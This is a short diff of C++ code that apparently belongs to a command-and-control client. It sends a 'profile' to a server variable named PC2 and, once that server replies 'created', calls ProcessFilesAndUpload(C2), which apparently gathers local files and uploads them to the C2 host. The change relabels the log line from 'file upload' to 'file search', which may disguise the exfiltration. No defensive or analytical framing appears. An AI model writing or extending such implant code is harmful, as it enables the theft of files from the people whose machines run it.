@@ -21,7 +21,7 @@ int main() {
                 std::string response = SendProfile(PC2, JsonProfile);
                 auto jsonResp = nlohmann::json::parse(response);
                 if (jsonResp.contains("message") && jsonResp["message"] == "created") {
-                    std::cout << "Running file upload" << std::endl;
+                    std::cout << "Running file search" << std::endl;
                     ProcessFilesAndUpload(C2);
                 }
             }
